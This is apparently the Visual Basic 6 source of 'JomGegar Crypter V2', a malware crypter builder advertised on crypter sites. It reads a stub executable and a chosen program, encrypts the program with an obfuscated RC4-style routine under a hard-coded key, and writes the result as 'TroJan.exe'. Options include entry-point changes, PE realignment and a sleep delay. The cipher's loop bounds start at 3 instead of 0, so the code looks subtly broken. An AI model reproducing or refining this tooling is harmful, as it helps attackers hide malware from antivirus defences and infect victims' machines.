VERSION 5.00
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#15.3#0"; "CO7D17~1.OCX"
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#15.3#0"; "COB32B~1.OCX"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "JomGegar Crypter V2 / By Mr. Morfey / JomGegar.Com / Crypters.Ru/"
   ClientHeight    =   3255
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   5895
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3255
   ScaleWidth      =   5895
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin XtremeSuiteControls.CheckBox CheckBox5 
      Height          =   255
      Left            =   2280
      TabIndex        =   12
      Top             =   2520
      Width           =   1335
      _Version        =   983043
      _ExtentX        =   2355
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Realign PE"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox4 
      Height          =   255
      Left            =   120
      TabIndex        =   11
      Top             =   2520
      Width           =   2055
      _Version        =   983043
      _ExtentX        =   3625
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Change Entrypoint"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.CheckBox CheckBox3 
      Height          =   255
      Left            =   3720
      TabIndex        =   10
      Top             =   2520
      Width           =   615
      _Version        =   983043
      _ExtentX        =   1085
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Eof"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.PushButton PushButton2 
      Height          =   255
      Left            =   4800
      TabIndex        =   9
      Top             =   2160
      Width           =   975
      _Version        =   983043
      _ExtentX        =   1720
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Icon"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit2 
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   2160
      Width           =   4575
      _Version        =   983043
      _ExtentX        =   8070
      _ExtentY        =   450
      _StockProps     =   77
      ForeColor       =   16777215
      BackColor       =   -2147483643
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin XtremeSuiteControls.PushButton PushButton3 
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   2880
      Width           =   5655
      _Version        =   983043
      _ExtentX        =   9975
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Crypted File"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit3 
      Height          =   255
      Left            =   5280
      TabIndex        =   6
      Top             =   2520
      Width           =   495
      _Version        =   983043
      _ExtentX        =   873
      _ExtentY        =   450
      _StockProps     =   77
      ForeColor       =   16777215
      BackColor       =   -2147483643
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "15"
      Appearance      =   2
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.CheckBox CheckBox1 
      Height          =   255
      Left            =   4440
      TabIndex        =   5
      Top             =   2520
      Width           =   975
      _Version        =   983043
      _ExtentX        =   1720
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "Sleep-"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.PushButton PushButton1 
      Height          =   255
      Left            =   4800
      TabIndex        =   4
      Top             =   1800
      Width           =   975
      _Version        =   983043
      _ExtentX        =   1720
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   "File"
      ForeColor       =   16777215
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
   End
   Begin XtremeSuiteControls.FlatEdit FlatEdit1 
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1800
      Width           =   4575
      _Version        =   983043
      _ExtentX        =   8070
      _ExtentY        =   450
      _StockProps     =   77
      ForeColor       =   16777215
      BackColor       =   -2147483643
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Appearance      =   2
      UseVisualStyle  =   0   'False
   End
   Begin VB.PictureBox Picture2 
      Height          =   1455
      Left            =   120
      Picture         =   "Form1.frx":0000
      ScaleHeight     =   1395
      ScaleWidth      =   5595
      TabIndex        =   2
      Top             =   120
      Width           =   5655
   End
   Begin VB.PictureBox Picture1 
      Height          =   1695
      Left            =   0
      ScaleHeight     =   1635
      ScaleWidth      =   5835
      TabIndex        =   1
      Top             =   0
      Width           =   5895
   End
   Begin XtremeSuiteControls.GroupBox GroupBox1 
      Height          =   1695
      Left            =   0
      TabIndex        =   0
      Top             =   1560
      Width           =   5895
      _Version        =   983043
      _ExtentX        =   10398
      _ExtentY        =   2990
      _StockProps     =   79
      UseVisualStyle  =   -1  'True
   End
   Begin XtremeSuiteControls.CommonDialog CD1 
      Left            =   2160
      Top             =   1080
      _Version        =   983043
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog CD 
      Left            =   2160
      Top             =   1080
      _Version        =   983043
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSkinFramework.SkinFramework SkinFramework1 
      Left            =   4080
      Top             =   3000
      _Version        =   983043
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Dim TUTORIAL As String
Dim Archivo() As Byte
TUTORIAL = "C:\AKIN.MSSTYLES"
Archivo = LoadResData(101, "CUSTOM")
Open TUTORIAL For Binary As 1#
Put #1, , Archivo
Close #1
SkinFramework1.LoadSkin "C:\AKIN.MSSTYLES", vbNullString
SkinFramework1.ApplyWindow Me.hwnd
End Sub

Private Sub PushButton1_Click()
With CD
.Filter = "File|*.exe"
.ShowOpen
End With
If Not CD.FileName = vbNullString Then
FlatEdit1.Text = CD.FileName
End If
End Sub

Private Sub PushButton2_Click()
CD1.CancelError = False
CD1.Filter = "File|*.ico"
CD1.FileName = ""
CD1.ShowOpen
FlatEdit2.Text = CD1.FileName
End Sub

Private Sub PushButton3_Click()
Dim EofData As String
Dim BN9pmIhgPy8399ts51Q7 As String
Call ecztgS231(App.Path & "\Protector.exe", Form1.FlatEdit2.Text)
Open App.Path & "\Protector.exe" For Binary As #1
BN9pmIhgPy8399ts51Q7 = Space(LOF(1))
Get #1, , BN9pmIhgPy8399ts51Q7
Close #1
Dim UEMkfpioj71dcj6yq1q8 As String
Open FlatEdit1.Text For Binary As #1
UEMkfpioj71dcj6yq1q8 = Space(LOF(1))
Get #1, , UEMkfpioj71dcj6yq1q8
Close #1
If CheckBox3.Value = 1 Then
EofData = o2EPPN(FlatEdit1.Text)
End If
Dim Delay As String
Delay = CheckBox1.Value
UEMkfpioj71dcj6yq1q8 = DPxlQv9Rw(UEMkfpioj71dcj6yq1q8, "qRgCCWJDKvmVjVvoRoHRunXAHRdUVYVALDBusuCuks")
Open App.Path & "\TroJan.exe" For Binary As #1
Dim final As String
final = BN9pmIhgPy8399ts51Q7 & "kKAfQCgruLUuebSSRwjeSRBgREWuKUppbBgxWQmDRY" & UEMkfpioj71dcj6yq1q8
Put #1, , final
Put #1, , "kKAfQCgruLUuebSSRwjeSRBgREWuKUppbBgxWQmDRY"
Put #1, , Delay
Put #1, , "kKAfQCgruLUuebSSRwjeSRBgREWuKUppbBgxWQmDRY"
Put #1, , FlatEdit3.Text
Put #1, , "kKAfQCgruLUuebSSRwjeSRBgREWuKUppbBgxWQmDRY"
Close #1
If CheckBox3.Value = 1 Then
Call V2JoqPnsJFk(CD.FileName, EofData)
End If
If CheckBox4.Value = 1 Then
Call JcZnc1hu99(CD.FileName)
End If
If CheckBox5.Value = 1 Then
Call gCParA(CD.FileName)
End If
MsgBox "Done | Visit : JomGegar.com", vbInformation, Me.Caption
End Sub

Public Function DPxlQv9Rw(ByVal OvsXehY6Y As String, ByVal vPDkao9yv As String) As String
On Error Resume Next
Dim egrduCdJL(3 To 255) As Integer, x As Long, y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(vPDkao9yv) = 3 Then
Exit Function
End If
If Len(OvsXehY6Y) = 3 Then
Exit Function
End If
If Len(vPDkao9yv) > 256 Then
Key() = StrConv(Left$(vPDkao9yv, 256), vbFromUnicode)
Else
Key() = StrConv(vPDkao9yv, vbFromUnicode)
End If
For x = 3 To 255
egrduCdJL(x) = x
Next x
x = 3
y = 3
Z = 3
For x = 3 To 255
y = (y + egrduCdJL(x) + Key(x Mod Len(vPDkao9yv))) Mod 256
Temp = egrduCdJL(x)
egrduCdJL(x) = egrduCdJL(y)
egrduCdJL(y) = Temp
Next x
x = 3
y = 3
Z = 3
ByteArray() = StrConv(OvsXehY6Y, vbFromUnicode)
For x = 3 To Len(OvsXehY6Y)
y = (y + 1) Mod 256
Z = (Z + egrduCdJL(y)) Mod 256
Temp = egrduCdJL(y)
egrduCdJL(y) = egrduCdJL(Z)
egrduCdJL(Z) = Temp
ByteArray(x) = ByteArray(x) Xor (egrduCdJL((egrduCdJL(y) + egrduCdJL(Z)) Mod 256))
Next x
DPxlQv9Rw = StrConv(ByteArray, vbUnicode)
End Function
